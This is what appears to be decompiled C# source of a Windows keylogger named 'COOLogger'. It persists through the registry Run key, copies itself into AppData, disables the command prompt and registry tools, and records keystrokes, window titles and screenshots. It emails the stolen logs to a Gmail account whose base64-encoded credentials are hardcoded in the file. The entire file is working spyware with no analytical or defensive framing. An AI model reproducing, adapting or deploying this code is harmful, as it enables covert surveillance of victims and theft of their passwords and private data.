using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class woNcVFmpKmqFPkx
{
	private static string kXyUTvdugkKkvpI = "bG9nc2Zvcml2YW5AZ21haWwuY29t";

	private static string FcxWOLWnCXLUsmQ = "dHJvamFuLjk1";

	private static string SyTYgWCLLKOlsze = "smtp.gmail.com";

	private static int qqHKNFdslVDGaDH = 587;

	private static string oNcVFmpKmqFPkxk;

	private static string XyUTvdugkKkvpIF;

	private static string cxWOLWnCXLUsmQS;

	private static string yTYgWCLLKOlszeq;

	private static string qHKNFdslVDGaDHV;

	private static string QGluusxjcjOaapt;

	private static int BMGYIeOZebmESab = 2400000;

	private static string UqDRyQCGgURLdbx = null;

	private static object VSBOnnPXjMfLjBa = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string kJEgiPVowmSNOMR = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage CJQgIHXNPHgJnlU = new MailMessage();

	private static SmtpClient ZFokYtjaoyhhUHh = new SmtpClient();

	[AccessedThroughProperty("FokYtjaoyhhUHhE")]
	private static ERfNeQUtifZroLh _FokYtjaoyhhUHhE;

	private static object VhkzVWfpkOdwQje = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox iMqaWLfWNakTTHs = new RichTextBox();

	private static ERfNeQUtifZroLh FokYtjaoyhhUHhE
	{
		get
		{
			return _FokYtjaoyhhUHhE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_FokYtjaoyhhUHhE != null)
			{
				ERfNeQUtifZroLh.KeyDown -= twoNcVFmpKmqFPk;
			}
			_FokYtjaoyhhUHhE = value;
			if (_FokYtjaoyhhUHhE != null)
			{
				ERfNeQUtifZroLh.KeyDown += twoNcVFmpKmqFPk;
			}
		}
	} = new ERfNeQUtifZroLh();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cc: Expected O, but got Unknown
		//IL_02ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f5: Expected O, but got Unknown
		QGluusxjcjOaapt = Conversions.ToString(true);
		cxWOLWnCXLUsmQS = Conversions.ToString(true);
		yTYgWCLLKOlszeq = Conversions.ToString(true);
		qHKNFdslVDGaDHV = Conversions.ToString(false);
		XyUTvdugkKkvpIF = Conversions.ToString(true);
		oNcVFmpKmqFPkxk = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, VSBOnnPXjMfLjBa, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(VSBOnnPXjMfLjBa, (object)"\\JQgIHXNPHgJnlUI.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(kJEgiPVowmSNOMR + "\\JQgIHXNPHgJnlUI.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(VSBOnnPXjMfLjBa, (object)"\\"), VhkzVWfpkOdwQje))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(VSBOnnPXjMfLjBa, (object)"\\"), VhkzVWfpkOdwQje)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(VSBOnnPXjMfLjBa, (object)"\\"), VhkzVWfpkOdwQje)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(VSBOnnPXjMfLjBa, (object)"\\"), VhkzVWfpkOdwQje)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(VSBOnnPXjMfLjBa, (object)"\\"), VhkzVWfpkOdwQje) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(oNcVFmpKmqFPkxk))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(VhkzVWfpkOdwQje)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(VhkzVWfpkOdwQje), Operators.ConcatenateObject(Operators.ConcatenateObject(VSBOnnPXjMfLjBa, (object)"\\"), VhkzVWfpkOdwQje));
			}
		}
		if (Conversions.ToBoolean(XyUTvdugkKkvpIF))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(VSBOnnPXjMfLjBa, (object)"\\JQgIHXNPHgJnlUI.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(cxWOLWnCXLUsmQS))
		{
			Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(yTYgWCLLKOlszeq))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(qHKNFdslVDGaDHV))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(2400000);
		val.add_Tick((EventHandler)RfNeQUtifZroLhG_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)MITXlHISbWzQiDW_Ticked);
		val2.Start();
		FokYtjaoyhhUHhE.GMITXlHISbWzQiD();
		Application.Run();
	}

	private static string VqrCZGjyfmFNDid()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string xkXyUTvdugkKkvp(string eqqHKNFdslVDGaD)
	{
		byte[] bytes = Convert.FromBase64String(eqqHKNFdslVDGaD);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void RfNeQUtifZroLhG_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(QGluusxjcjOaapt))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = oICrXghfkVOVzNM(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(VSBOnnPXjMfLjBa, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(VSBOnnPXjMfLjBa, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(xkXyUTvdugkKkvp(kXyUTvdugkKkvpI));
				mailMessage.To.Add(xkXyUTvdugkKkvp(kXyUTvdugkKkvpI));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = iMqaWLfWNakTTHs.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(xkXyUTvdugkKkvp(kXyUTvdugkKkvpI), xkXyUTvdugkKkvp(FcxWOLWnCXLUsmQ));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				iMqaWLfWNakTTHs.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage cJQgIHXNPHgJnlU = CJQgIHXNPHgJnlU;
		cJQgIHXNPHgJnlU.From = new MailAddress(xkXyUTvdugkKkvp(kXyUTvdugkKkvpI));
		cJQgIHXNPHgJnlU.To.Add(xkXyUTvdugkKkvp(kXyUTvdugkKkvpI));
		cJQgIHXNPHgJnlU.Subject = "COOLogger Logs from - " + Environment.UserName;
		cJQgIHXNPHgJnlU.Body = iMqaWLfWNakTTHs.get_Text();
		cJQgIHXNPHgJnlU = null;
		SmtpClient zFokYtjaoyhhUHh = ZFokYtjaoyhhUHh;
		zFokYtjaoyhhUHh.Host = "smtp.gmail.com";
		zFokYtjaoyhhUHh.Port = 587;
		zFokYtjaoyhhUHh.EnableSsl = true;
		zFokYtjaoyhhUHh.Credentials = new NetworkCredential(xkXyUTvdugkKkvp(kXyUTvdugkKkvpI), xkXyUTvdugkKkvp(FcxWOLWnCXLUsmQ));
		zFokYtjaoyhhUHh.Send(CJQgIHXNPHgJnlU);
		zFokYtjaoyhhUHh = null;
		iMqaWLfWNakTTHs.set_Text("");
	}

	public static void twoNcVFmpKmqFPk(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox val = iMqaWLfWNakTTHs;
		val.set_Text(val.get_Text() + FokYtjaoyhhUHhE.WQGluusxjcjOaap(e));
	}

	public static void MITXlHISbWzQiDW_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(UqDRyQCGgURLdbx, VqrCZGjyfmFNDid(), false) != 0)
		{
			UqDRyQCGgURLdbx = VqrCZGjyfmFNDid();
			if (Operators.CompareString(UqDRyQCGgURLdbx, "", false) != 0)
			{
				RichTextBox val = iMqaWLfWNakTTHs;
				val.set_Text(val.get_Text() + "\r\n\r\n~~~~~" + UqDRyQCGgURLdbx + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string oICrXghfkVOVzNM(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
